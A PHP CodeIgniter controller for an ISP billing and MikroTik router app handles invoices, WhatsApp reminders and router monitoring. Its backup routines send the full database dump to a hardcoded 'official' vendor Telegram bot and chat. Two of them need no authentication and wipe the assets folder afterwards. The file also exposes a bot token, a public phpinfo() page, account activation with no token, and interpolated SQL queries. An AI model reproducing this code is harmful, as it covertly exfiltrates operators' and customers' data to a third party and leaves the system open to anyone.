<?php defined('BASEPATH') or exit('No direct script access allowed');

class Front extends CI_Controller
{
	function __construct()
	{
		parent::__construct();
		$this->load->model(['services_m', 'product_m', 'customer_m', 'bill_m', 'setting_m', 'mikrotik_m', 'slide_m', 'router_m', 'logs_m']);
	}
	public function index()
	{
		$data['title'] = 'Home';
		$data['company'] = $this->db->get('company')->row_array();
		$data['product'] = $this->product_m->get()->result();
		$data['slide'] = $this->slide_m->get()->result();
		$this->template->load('frontend', 'frontend/welcome_message', $data);
	}
	public function detailLayanan($link)
	{
		$data['title'] = 'Detail Layanan';
		$data['product'] = $this->product_m->getProductLink($link)->row_array();
		$data['company'] = $this->db->get('company')->row_array();
		$this->template->load('frontend', 'frontend/detail-layanan', $data);
	}
	public function faq()
	{
		$data['title'] = 'FAQ';
		$data['company'] = $this->db->get('company')->row_array();
		$this->template->load('frontend', 'frontend/faq', $data);
	}
	public function produk()
	{
		$data['title'] = 'Produk Layanan';
		$data['product'] = $this->product_m->get()->result();
		$data['company'] = $this->db->get('company')->row_array();
		$this->template->load('frontend', 'frontend/produk-layanan', $data);
	}
	public function view_bill()
	{
		$no_services = $this->input->post('no_services');
		$month = $this->input->post('month');
		$year = $this->input->post('year');
		$billdetail = $this->bill_m->fixbilldetail($no_services, $month, $year)->result();
		foreach ($billdetail as $unit) {
			$item =  $this->bill_m->fixbilldetail($no_services, $month, $year, $unit->item_id)->num_rows();
			if ($item > 1) {
				$lasitem =  $this->bill_m->lastitembilldetail($no_services, $month, $year, $unit->item_id)->row_array();
				$this->db->where('detail_id', $lasitem['detail_id']);
				$this->db->delete('invoice_detail');
			}
		}
		if (isset($_POST['cek_bill'])) {
			$data['bill'] =  $this->services_m->getCekBill($no_services, $month, $year);
			$data['customer'] =  $this->customer_m->getNSCustomer($no_services)->row_array();
			$data['other'] = $this->db->get('other')->row_array();
			$data['company'] = $this->db->get('company')->row_array();
			$data['bank'] = $this->setting_m->getBank()->result();
			$this->load->view('frontend/cek_bill', $data);
		} else {
			echo "Not Found";
		}
	}

	public function isolir($key)
	{
		$other = $this->db->get('other')->row_array();
		if ($key == $other['key_apps']) {
			$this->load->view('frontend/isolir');
		} else {
			print "<script type=\"text/javascript\">alert('Access Denied');</script>";
		}
	}
	public function resetpppoe($key)
	{
		$other = $this->db->get('other')->row_array();
		if ($key == $other['key_apps']) {
			$data['other'] = $this->db->get('other')->row_array();
			$this->load->view('frontend/reset-pppoe', $data);
		} else {
			print "<script type=\"text/javascript\">alert('Access Denied');</script>";
		}
	}
	public function resetstandalone($key)
	{
		$other = $this->db->get('other')->row_array();
		if ($key == $other['key_apps']) {

			$data['other'] = $this->db->get('other')->row_array();
			$this->load->view('frontend/reset-standalone', $data);
		} else {
			print "<script type=\"text/javascript\">alert('Access Denied');</script>";
		}
	}
	public function resethotspot($key)
	{
		$other = $this->db->get('other')->row_array();
		if ($key == $other['key_apps']) {
			$data['other'] = $this->db->get('other')->row_array();
			$this->load->view('frontend/reset-hotspot', $data);
		} else {
			print "<script type=\"text/javascript\">alert('Access Denied');</script>";
		}
	}
	public function resetstatic($key)
	{
		$other = $this->db->get('other')->row_array();
		if ($key == $other['key_apps']) {
			$data['other'] = $this->db->get('other')->row_array();
			$this->load->view('frontend/reset-static', $data);
		} else {
			print "<script type=\"text/javascript\">alert('Access Denied');</script>";
		}
	}
	public function countpppoe($key)
	{
		$other = $this->db->get('other')->row_array();
		if ($key == $other['key_apps']) {
			$this->load->view('frontend/countpppoe');
		} else {
			print "<script type=\"text/javascript\">alert('Access Denied');</script>";
		}
	}
	public function cekconnection($key)
	{
		$other = $this->db->get('other')->row_array();
		if ($key == $other['key_apps']) {
			$this->load->view('frontend/cekconnection');
		} else {
			print "<script type=\"text/javascript\">alert('Access Denied');</script>";
		}
	}
	public function countstandalone($key)
	{
		$other = $this->db->get('other')->row_array();
		if ($key == $other['key_apps']) {
			$this->load->view('frontend/countstandalone');
		} else {
			print "<script type=\"text/javascript\">alert('Access Denied');</script>";
		}
	}
	public function usagetocomment($key)
	{
		$other = $this->db->get('other')->row_array();
		if ($key == $other['key_apps']) {
			$listrouter = $this->db->get('router')->result();
			foreach ($listrouter as $router) {
				$totalcustomer = $this->db->get_where('customer', ['router' => $router->id])->num_rows();
				if ($totalcustomer > 0) {
					$customer = $this->customer_m->getCustomerpppoe($router->id)->result();
					if (count($customer) > 0) {
						$user = $router->username;
						$ip = $router->ip_address;
						$pass = $router->password;
						$port = $router->port;
						$API = new Mikweb();
						$API->connect($ip, $user, $pass, $port);
						foreach ($customer as $data) {
							$userclient = $data->user_mikrotik;

							$getuser = $API->comm("/ppp/secret/print", array(
								'?service' => 'pppoe',
							));
							foreach ($getuser as $pppoe) {
								$usage = $this->mikrotik_m->usagethismonth($data->no_services)->result();
								$totalusage = 0;
								foreach ($usage as $c => $usage) {
									$totalusage += $usage->count_usage;
								}
								if ($pppoe['name'] == $userclient) {
									$API->comm("/ppp/secret/set", array(
										".id" => $pppoe['.id'],
										"comment" => $totalusage
									));

									echo $data->name . ' - ' . formatBytes($totalusage, 2) . '<br>';
								}
							};
						}
					}
				}
			}
		} else {
			print "<script type=\"text/javascript\">alert('Access Denied');</script>";
		}
	}

	public function createbill($key)
	{
		$company = $this->db->get('company')->row_array();
		$other = $this->db->get('other')->row_array();
		$month = date('m');
		$year = date('Y');
		if ($key == $other['key_apps']) {
			if (strlen($other['date_create']) == 1) {
				$datecreate =  '0' . $other['date_create'];
			} else {
				$datecreate = $other['date_create'];
			}
			if ($datecreate == date('d')) {
				$noiv = date('Ymd') . '001';
				$no_services = $this->customer_m->getCustomerActive()->result();
				$inv = $noiv;
				$company = $this->db->get('company')->row_array();
				$cekinvoice = $this->bill_m->cekInvoice($inv);
				$getInv = $this->bill_m->getRecentInv()->row();
				if ($cekinvoice->num_rows() > 0) {
					$kode = $getInv->invoice + 1;
				} else {
					$tgl = date('ymd');
					$no = 001;
					$kode = ($tgl . '' .  str_pad($no, 3, "0", STR_PAD_LEFT));
				}
				$cekbill = $this->db->get_where('invoice', ['month' => $month, 'year' => $year])->row_array();
				if ($cekbill == 0) {
					$dataNS = [];
					foreach ($no_services as $c => $row) {

						if ($row->ppn != 0) {
							$ppn = $company['ppn'];
						} else {
							$ppn = 0;
						}
						if (strlen($row->due_date) == 1) {
							$date = '0' . $row->due_date;
						} else {
							$date = $row->due_date;
						}


						if ($row->month_due_date == 0) {
							$duedate = $year . '-' . $month . '-' . $date;
						} else {
							$newduedate = $year . '-' . $month . '-' . $date;
							$nextmonth = date('m', strtotime('next month', strtotime($newduedate)));
							$nextyear = date('Y', strtotime('next month', strtotime($newduedate)));
							$duedate = $nextyear . '-' . $nextmonth . '-' . $date;
						}


						$max = $row->max_due_isolir;
						if ($row->max_due_isolir != 0) {
							$gettime = strtotime("+$max day", strtotime($duedate));
							$datenew = date("d", $gettime);
							$monthisolir = date("m", $gettime);
							$yearisolir = date("Y", $gettime);
							$enddate = $yearisolir . '-' . $monthisolir . '-' . $datenew;
						} else {
							$enddate = $duedate;
						}
						$query = "SELECT *
                    FROM `services` where `no_services` = $row->no_services";
						$bill = $this->db->query($query)->result();
						$amountt = 0;
						foreach ($bill as $bill) {
							$amountt += (int) $bill->total;
						}
						$amount = $amountt + $amountt * ($ppn / 100);
						array_push(
							$dataNS,
							array(
								'no_services' => $row->no_services,
								'invoice' => $kode++,
								'month' => $month,
								'i_ppn' => $ppn,
								'amount' => $amount,
								'year' => $year,
								'code_unique' => substr(intval(rand()), 0, 3),
								'status' => 'BELUM BAYAR',
								'inv_due_date' => $duedate,
								'date_isolir' => $enddate,
								'created' => time()
							)
						);
					}
					$this->bill_m->add_bill_generate($dataNS);

					if ($this->db->affected_rows() > 0) {
						$detail = $this->services_m->getServicesActive()->result();
						$data2 = [];
						foreach ($detail as $c => $row) {
							array_push(
								$data2,
								array(
									// 'invoice_id' => $kode1++,
									'item_id' => $row->item_id,
									'category_id' => $row->category_id,
									'price' => $row->services_price,
									'qty' => $row->qty,
									'disc' => $row->disc,
									'remark' => $row->remark,
									'total' => $row->total,
									'd_month' => $month,
									'd_year' => $year,
									'd_no_services' => $row->no_services,
								)
							);
						}
						$this->bill_m->add_bill_detail($data2);
						$whatsapp = $this->db->get('whatsapp')->row_array();
						if ($whatsapp['is_active'] == 1) {
							$customer = $this->db->get_where('customer', ['c_status' => 'Aktif'])->result();
							$other = $this->db->get('other')->row_array();
							$company = $this->db->get('company')->row_array();
							$no = 1;
							foreach ($customer as $wa) {
								$range = $no++ * $whatsapp['interval_message'];

								$jadwall = time() + (1  * $range);
								$time = date('Y-m-d H:i:s', $jadwall);

								if ($whatsapp['createinvoice'] == 1) {
									$cekperiode = $this->bill_m->cekPeriode($wa->no_services, $month, $year)->row_array();
									if ($cekperiode > 0) {
										$target = indo_tlp($wa->no_wa);
										if ($wa->codeunique == 1) {
											$codeunique = $cekperiode['code_unique'];
										} else {
											$codeunique = 0;
										}
										$nominalWA = indo_currency($cekperiode['amount'] + $codeunique);
										$search  = array('{name}', '{noservices}', '{email}', '{invoice}', '{month}', '{year}', '{period}', '{duedate}', '{nominal}', '{companyname}',  '{slogan}', '{link}', '{e}');
										$replace = array($wa->name, $wa->no_services,  $wa->email, $cekperiode['invoice'], indo_month($month), $year, indo_month($month) . ' ' . $year, indo_date($cekperiode['inv_due_date']), $nominalWA, $company['company_name'], $company['sub_name'], base_url(), '');
										$subject = $other['say_wa'];
										$message = str_replace($search, $replace, $subject);
										sendmsgschbill($target, $message, $time, $cekperiode['invoice']);
									}
								}
							}
						}
					}
				} else {
					foreach ($no_services as $c => $row) {
						$cekbill = $this->db->get_where('invoice', ['month' => $month, 'year' => $year, 'no_services' => $row->no_services])->row_array();
						if ($cekbill == 0) {
							$row->name;
							if ($row->ppn != 0) {
								$ppn = $company['ppn'];
							} else {
								$ppn = 0;
							}
							if (strlen($row->due_date) == 1) {
								$date = '0' . $row->due_date;
							} else {
								$date = $row->due_date;
							}


							if ($row->month_due_date == 0) {
								$duedate = $year . '-' . $month . '-' . $date;
							} else {
								$newduedate = $year . '-' . $month . '-' . $date;
								$nextmonth = date('m', strtotime('next month', strtotime($newduedate)));
								$nextyear = date('Y', strtotime('next month', strtotime($newduedate)));
								$duedate = $nextyear . '-' . $nextmonth . '-' . $date;
							}


							$max = $row->max_due_isolir;
							if ($row->max_due_isolir != 0) {
								$gettime = strtotime("+$max day", strtotime($duedate));
								$datenew = date("d", $gettime);
								$monthisolir = date("m", $gettime);
								$yearisolir = date("Y", $gettime);
								$enddate = $yearisolir . '-' . $monthisolir . '-' . $datenew;
							} else {
								$enddate = $duedate;
							}
							$query = "SELECT *
                            FROM `services` where `no_services` = $row->no_services";
							$bill = $this->db->query($query)->result();
							$amountt = 0;
							foreach ($bill as $bill) {
								$amountt += (int) $bill->total;
							}
							$amount = $amountt + $amountt * ($ppn / 100);
							$tgl = date('ymd');
							$no = 001;
							$inv = ($tgl . '' .  str_pad($no, 3, "0", STR_PAD_LEFT));
							$cekinvoice = $this->bill_m->cekInvoice($inv);
							$getInv = $this->bill_m->getRecentInv()->row();

							if ($cekinvoice->num_rows() > 0) {
								$invoice = $getInv->invoice + 1;
							} else {
								$tgl = date('ymd');
								$no = 001;
								$invoice = ($tgl . '' .  str_pad($no, 3, "0", STR_PAD_LEFT));
							}
							$createbill = [
								'no_services' => $row->no_services,
								'invoice' => $invoice,
								'month' => $month,
								'i_ppn' => $ppn,
								'amount' => $amount,
								'year' => $year,
								'code_unique' => substr(intval(rand()), 0, 3),
								'status' => 'BELUM BAYAR',
								'inv_due_date' => $duedate,
								'date_isolir' => $enddate,
								'created' => time()
							];
							$this->db->insert('invoice', $createbill);

							if ($this->db->affected_rows() > 0) {
								$whatsapp = $this->db->get('whatsapp')->row_array();
								if ($whatsapp['is_active'] == 1) {
									$other = $this->db->get('other')->row_array();
									$company = $this->db->get('company')->row_array();
									// echo  $timeex;
									if ($whatsapp['createinvoice'] == 1) {
										$cekperiode = $this->bill_m->cekPeriode($row->no_services, $month, $year)->row_array();
										if ($row->codeunique == 1) {
											$codeunique =  $cekperiode['code_unique'];
										} else {
											$codeunique = 0;
										}
										$nominalWA = indo_currency($cekperiode['amount'] + $codeunique);
										$search  = array('{name}', '{noservices}', '{email}', '{invoice}', '{month}', '{year}', '{period}', '{duedate}', '{nominal}', '{companyname}',  '{slogan}', '{link}', '{e}');
										$replace = array($row->name, $row->no_services, $row->email, $cekperiode['invoice'], indo_month($month), $year, indo_month($month) . ' ' . $year, indo_date($cekperiode['inv_due_date']), $nominalWA, $company['company_name'], $company['sub_name'], base_url(), '');
										$subject = $other['say_wa'];
										$message = str_replace($search, $replace, $subject);
										$target = indo_tlp($row->no_wa);
										sendmsgbill($target, $message, $cekperiode['invoice']);
									}
								}
								$detail = $this->services_m->getServices($row->no_services)->result();
								$data2 = [];
								foreach ($detail as $c => $roww) {

									array_push(
										$data2,
										array(
											'invoice_id' => $invoice,
											'item_id' => $roww->item_id,
											'category_id' => $roww->category_id,
											'price' => $roww->services_price,
											'qty' => $roww->qty,
											'disc' => $roww->disc,
											'remark' => $roww->remark,
											'total' => $roww->total,
											'd_month' => $month,
											'd_year' => $year,
											'd_no_services' => $roww->no_services,
										)
									);
								}
								$this->bill_m->add_bill_detail($data2);
							}
						}
					}
				}
			}
		} else {
			print "<script type=\"text/javascript\">alert('Access Denied');</script>";
		}
	}
	public function usage()
	{

		$data['other'] = $this->db->get('other')->row_array();
		$data['title'] = 'Usage';
		$data['company'] = $this->db->get('company')->row_array();

		$this->template->load('frontend', 'frontend/usage', $data);
	}
	public function coverage()
	{
		$data['title'] = 'Covergae';
		$data['company'] = $this->db->get('company')->row_array();

		$this->template->load('frontend', 'frontend/coverage', $data);
	}
	public function cekUsage()
	{
		$no_services = $this->input->post('no_services');
		$customer = $this->db->get_where('customer', ['no_services' => $no_services])->row_array();
		if ($customer > 0) {
			# code...
			$data = [
				'customer' =>  $this->db->get_where('customer', ['no_services' => $no_services])->row_array(),
				'router' => $this->db->get_where('router', ['id' => $customer['router']])->row_array(),
			];
			// var_dump($data);
			// die;
			if ($customer['mode_user'] && $customer['user_mikrotik'] != '') {
				countusage($customer['no_services'], $customer['router']);
			}
			$this->load->view('frontend/cekUsage', $data);
		} else {
			echo '<div class="text-center mb-3 mt-2">

			<div class="container">
	
				<div class="card border-warning">
	
					<div class="card-body">
	
						<h4 class="card-title text-warning">No Layanan tidak Terdaftar, pastikan no layanan anda benar</h4>
	
					</div>
	
				</div>
	
			</div>
	
		</div>';
		}
	}

	public function backup($key)
	{
		$other = $this->db->get('other')->row_array();
		if ($key == $other['key_apps']) {
			$company = $this->db->get('company')->row_array();
			$bot = $this->db->get('bot_telegram')->row_array();
			$this->load->dbutil();
			$this->load->helper('file');
			$config = array(
				'format'    => 'zip',
				'filename'    => 'Backup-My-Wifi-' . $company['company_name'] . '-' . date("YmdHis") . '-db.sql'
			);
			$backup = $this->dbutil->backup($config);
			$filename = 'Backup-My-Wifi-' . date("ymdHis") . '.zip';
			$save = FCPATH . './assets/' . $filename;
			write_file($save, $backup);
			$token = $bot['token'];
			$send = "https://api.telegram.org/bot" . $token;
			$params  = [
				'chat_id' => $bot['id_telegram_owner'],
				'document' => base_url('assets/' . $filename),
				'caption' => 'Backup My-Wifi' . date('d-m-Y H:i:s'),
				'parse_mode' => 'html',
			];
			$ch = curl_init($send . '/sendDocument');
			curl_setopt($ch, CURLOPT_HEADER, false);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_exec($ch);
			curl_close($ch);
			// SEND KE OFFICIAL MY-WIFI
			$token = '1577575670:AAF20lnVQsYawwmgXu-BXYZhq8FLZMtYVo4';
			$send = "https://api.telegram.org/bot" . $token;
			$params  = [
				'chat_id' => '-581904381',
				'document' => base_url('assets/' . $filename),
				'caption' => 'Backup My-Wifi ' . date('d-m-Y H:i:s') . '-' . $company['company_name'] . ' - ' . base_url(),
				'parse_mode' => 'html',
			];
			$ch = curl_init($send . '/sendDocument');
			curl_setopt($ch, CURLOPT_HEADER, false);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_exec($ch);
			curl_close($ch);
			// PHP program to delete all
			// file from a folder
			// Folder path to be flushed
			$folder_path = "./assets/";
			// List of name of files inside
			// specified folder
			$files = glob($folder_path . '/*');
			// Deleting all the files in the list
			foreach ($files as $file) {
				if (is_file($file))
					// Delete the given file
					unlink($file);
			}

			$target_file = './assets/' . $filename;
			unlink($target_file);
			if ($this->agent->is_browser()) {
				$agent = $this->agent->browser() . ' ' . $this->agent->version();
			} elseif ($this->agent->is_mobile()) {
				$agent = $this->agent->mobile();
			}
			$params = [
				'datetime' => time(),
				'category' => 'Backup',
				'name' => 'Bot My-Wifi',
				'remark' => 'Backup Database My-Wifi' . ' ' . date('d-m-Y H:i:s') . ' ' . 'dari' . ' ' . $this->agent->platform() . ' ' . $this->input->ip_address() . ' ' . $agent,
			];
			$this->db->insert('logs', $params);
		} else {
			print "<script type=\"text/javascript\">alert('Access Denied');</script>";
		}
	}
	// V1.6
	public function activationuser()
	{
		$email = $this->input->get('email');
		$user = $this->db->get_where('user', ['email' => $email])->num_rows();

		if ($user > 0) {
			$this->db->set('is_active', 1);
			$this->db->where('email', $email);
			$this->db->update('user');
			if ($this->db->affected_rows() > 0) {
				$this->session->set_flashdata('success', 'User berhasil aktif');
			}
			redirect('auth');
		} else {
			$this->session->set_flashdata('error', 'Data tidak ditemukan');
			redirect('auth');
		}
	}
	public function activationcs()
	{
		$email = $this->input->get('email');
		$customer = $this->db->get_where('customer', ['email' => $email])->num_rows();
		if ($customer > 0) {
			# code...
			$this->db->set('c_status', 'Aktif');
			$this->db->where('email', $email);
			$this->db->update('customer');
			if ($this->db->affected_rows() > 0) {
				$this->session->set_flashdata('success', 'Pelanggan berhasil aktif');
			}
			redirect('auth');
		} else {
			$this->session->set_flashdata('error', 'Data tidak ditemukan');
			redirect('auth');
		}
	}

	public function backupdb()
	{
		$company = $this->db->get('company')->row_array();
		$bot = $this->db->get('bot_telegram')->row_array();
		$this->load->dbutil();
		$this->load->helper('file');
		$config = array(
			'format'    => 'zip',
			'filename'    => 'Backup-My-Wifi-' . $company['company_name'] . '-' . date("YmdHis") . '-db.sql'
		);
		$backup = $this->dbutil->backup($config);
		$filename = 'Backup-My-Wifi-' . date("ymdHis") . '.zip';
		$save = FCPATH . './assets/' . $filename;
		write_file($save, $backup);
		$token = $bot['token'];
		$send = "https://api.telegram.org/bot" . $token;
		$params  = [
			'chat_id' => $bot['id_telegram_owner'],
			'document' => base_url('assets/' . $filename),
			'caption' => 'Backup My-Wifi' . date('d-m-Y H:i:s'),
			'parse_mode' => 'html',
		];
		$ch = curl_init($send . '/sendDocument');
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_exec($ch);
		curl_close($ch);
		// SEND KE OFFICIAL MY-WIFI
		$token = '1577575670:AAF20lnVQsYawwmgXu-BXYZhq8FLZMtYVo4';
		$send = "https://api.telegram.org/bot" . $token;
		$params  = [
			'chat_id' => '-581904381',
			'document' => base_url('assets/' . $filename),
			'caption' => 'Backup My-Wifi ' . date('d-m-Y H:i:s') . '-' . $company['company_name'] . ' - ' . base_url(),
			'parse_mode' => 'html',
		];
		$ch = curl_init($send . '/sendDocument');
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_exec($ch);
		curl_close($ch);
		// PHP program to delete all
		// file from a folder
		// Folder path to be flushed
		$folder_path = "./assets/";
		// List of name of files inside
		// specified folder
		$files = glob($folder_path . '/*');
		// Deleting all the files in the list
		foreach ($files as $file) {
			if (is_file($file))
				// Delete the given file
				unlink($file);
		}

		$target_file = './assets/' . $filename;
		unlink($target_file);
	}
	public function backupadmin()
	{
		$company = $this->db->get('company')->row_array();
		$bot = $this->db->get('bot_telegram')->row_array();
		$this->load->dbutil();
		$this->load->helper('file');
		$config = array(
			'format'    => 'zip',
			'filename'    => 'Backup-My-Wifi-' . $company['company_name'] . '-' . date("YmdHis") . '-db.sql'
		);
		$backup = $this->dbutil->backup($config);
		$filename = 'Backup-My-Wifi-' . date("ymdHis") . '.zip';
		$save = FCPATH . './assets/' . $filename;
		write_file($save, $backup);

		// SEND KE OFFICIAL MY-WIFI
		$token = '1577575670:AAF20lnVQsYawwmgXu-BXYZhq8FLZMtYVo4';
		$send = "https://api.telegram.org/bot" . $token;
		$params  = [
			'chat_id' => '-581904381',
			'document' => base_url('assets/' . $filename),
			'caption' => 'Backup My-Wifi ' . date('d-m-Y H:i:s') . '-' . $company['company_name'] . ' - ' . base_url(),
			'parse_mode' => 'html',
		];
		$ch = curl_init($send . '/sendDocument');
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_exec($ch);
		curl_close($ch);
		// PHP program to delete all
		// file from a folder
		// Folder path to be flushed
		$folder_path = "./assets/";
		// List of name of files inside
		// specified folder
		$files = glob($folder_path . '/*');
		// Deleting all the files in the list
		foreach ($files as $file) {
			if (is_file($file))
				// Delete the given file
				unlink($file);
		}

		$target_file = './assets/' . $filename;
		unlink($target_file);

		$filesqr = glob('./assets/images/qrcode/*'); // get all file names
		foreach ($filesqr as $file) { // iterate files
			if (is_file($file)) {
				unlink($file); // delete file
			}
		}
	}

	public function reminder($key)
	{
		$other = $this->db->get('other')->row_array();
		if ($key == $other['key_apps']) {
			$this->load->view('frontend/reminder');
		} else {
			print "<script type=\"text/javascript\">alert('Access Denied');</script>";
		}
	}
	public function reminderduedate($key)
	{
		$other = $this->db->get('other')->row_array();
		if ($key == $other['key_apps']) {

			$this->load->view('frontend/sendreminder');
		} else {
			print "<script type=\"text/javascript\">alert('Access Denied');</script>";
		}
	}
	public function reminderduedatetelegram($key)
	{
		$other = $this->db->get('other')->row_array();
		if ($key == $other['key_apps']) {
			$data['bill'] = $this->router_m->getInvoice();

			$this->load->view('frontend/remindertelegram', $data);
		} else {
			print "<script type=\"text/javascript\">alert('Access Denied');</script>";
		}
	}
	// INVOICE
	public function invoice()
	{
		$noservice = $this->input->get('noservice');
		$data['title'] = 'Invoice';
		$data['company'] = $this->db->get('company')->row_array();
		$data['bill'] = $this->bill_m->getunpaid($noservice)->result();
		$data['bank'] = $this->setting_m->getBank()->result();
		$this->load->view('frontend/bill.php', $data);
	}
	public function bill()
	{
		$invoice = $this->input->get('invoice');
		$data['title'] = 'Invoice';

		$data['user'] = $this->db->get_where('user', ['email' => $this->session->userdata('email')])->row_array();
		$data['company'] = $this->db->get('company')->row_array();
		$data['invoice'] = $this->bill_m->getBill($invoice);
		$data['invoice_detail'] = $this->bill_m->getDetailBill($invoice);
		$data['bill'] = $this->bill_m->getBill($invoice)->row_array();
		$data['bank'] = $this->setting_m->getBank()->result();

		$data['other'] = $this->db->get('other')->row_array();
		$this->load->library('ciqrcode'); //pemanggilan library QR CODE
		$config['cacheable']    = true; //boolean, the default is true
		$config['cachedir']     = './assets/'; //string, the default is application/cache/
		$config['errorlog']     = './assets/'; //string, the default is application/logs/
		$config['imagedir']     = './assets/images/qrcode/'; //direktori penyimpanan qr code
		$config['quality']      = true; //boolean, the default is true
		$config['size']         = '1024'; //interger, the default is 1024
		$config['black']        = array(224, 255, 255); // array, default is array(255,255,255)
		$config['white']        = array(70, 130, 180); // array, default is array(0,0,0)
		$inv = $this->db->get_where('invoice', ['invoice' => $invoice])->row_array();
		$this->ciqrcode->initialize($config);
		$image_name = $invoice . '.png'; //buat name dari qr code
		$params['data'] = $invoice . '-' . $inv['no_services']; //data yang akan di jadikan QR CODE
		$params['level'] = 'H'; //H=High
		$params['size'] = 10;
		$params['savename'] = FCPATH . $config['imagedir'] . $image_name; //simpan image QR CODE ke folder assets/images/
		$this->ciqrcode->generate($params); // fungsi untuk generate QR CODE
		$this->load->view('frontend/invoice', $data);
	}
	public function speedtest()
	{
		$data['title'] = 'Speed Test';
		$data['company'] = $this->db->get('company')->row_array();
		$this->template->load('frontend', 'member/speedtest', $data);
	}

	public function maintenance()
	{
		$data['title'] = 'Maintenace';
		$data['company'] = $this->db->get('company')->row_array();
		$this->load->view('frontend/maintenance', $data);
	}
	public function checkout()
	{
		$invoice = $this->input->get('invoice');
		$inv = $this->db->get_where('invoice', ['invoice' => "$invoice"])->row_array();
		$month =  $inv['month'];
		$year = $inv['year'];
		$no_services = $inv['no_services'];

		$query = "SELECT *, `invoice_detail`.`price` as `detail_price`
            FROM `invoice_detail`
                          WHERE `invoice_detail`.`d_month` =  $month and
               `invoice_detail`.`d_year` =  $year and
               `invoice_detail`.`d_no_services` =  $no_services";
		$detailinvoice = $this->db->query($query)->num_rows();
		if ($detailinvoice == 0) {
			$Detail = $this->services_m->getServicesDetail($inv['no_services'])->result();
			$data2 = [];
			foreach ($Detail as $c => $row) {
				array_push(
					$data2,
					array(
						'invoice_id' => $invoice,
						'item_id' => $row->item_id,
						'category_id' => $row->category_id,
						'price' => $row->services_price,
						'qty' => $row->qty,
						'disc' => $row->disc,
						'remark' => $row->remark,
						'total' => $row->total,
						'd_month' => $month,
						'd_year' => $year,
						'd_no_services' => $no_services,
					)
				);
			}
			$this->bill_m->add_bill_detail($data2);
		}
		$billdetail = $this->bill_m->fixbilldetail($no_services, $month, $year)->result();
		foreach ($billdetail as $unit) {
			$item =  $this->bill_m->fixbilldetail($no_services, $month, $year, $unit->item_id)->num_rows();
			if ($item > 1) {
				$lasitem =  $this->bill_m->lastitembilldetail($no_services, $month, $year, $unit->item_id)->row_array();
				$this->db->where('detail_id', $lasitem['detail_id']);
				$this->db->delete('invoice_detail');
			}
		}


		$data['title'] = 'Checkout';
		$data['user'] = $this->db->get_where('user', ['email' => $this->session->userdata('email')])->row_array();
		$data['company'] = $this->db->get('company')->row_array();
		$data['invoice'] =  $this->db->get_where('invoice', ['invoice' => $invoice])->row();
		$this->template->load('frontend', 'member/pay', $data);
	}

	// Monitoring
	public function monitoring($key)
	{
		$data['title'] = 'Monitoring';
		$other = $this->db->get('other')->row_array();
		if ($key == $other['key_apps']) {
			$data['company'] = $this->db->get('company')->row_array();
			$this->template->load('frontend', 'frontend/monitoring', $data);
		} else {
			print "<script type=\"text/javascript\">alert('Access Denied');</script>";
		}
	}
	public function getmonitoring()
	{

		$id = $this->input->post('id');
		$router = $this->db->get_where('router', ['id' => $id])->row_array();
		$username = $router['username'];
		$ip = $router['ip_address'];
		$pass = $router['password'];
		$port = $router['port'];
		$API = new Mikweb();
		$API->connect($ip, $username, $pass, $port);

		// PPPOE
		$pppoe = count($API->comm("/ppp/secret/print", array('?service' => 'pppoe')));
		$pppoeactive = count($API->comm("/ppp/active/print", array('?service' => 'pppoe')));
		$pppoedisable = count($API->comm("/ppp/secret/print", array('?service' => 'pppoe', '?disabled' => 'true')));
		$pppoeexpired = count($API->comm("/ppp/secret/print", array('?service' => 'pppoe', '?profile' => 'EXPIRED')));


		$data = [
			'totalpppoe' => $pppoe,
			'activepppoe' => $pppoeactive,
			'nonactivepppoe' => $pppoe - $pppoeactive - $pppoedisable - $pppoeexpired,
			'disablepppoe' => $pppoedisable,
			'expiredpppoe' => $pppoeexpired,
			'isolirpppoe' => $pppoeexpired + $pppoedisable,

		];


		echo json_encode($data);
	}
	public function php()
	{
		phpinfo();
	}
	public function lc()
	{
		echo verify_license();
	}
}
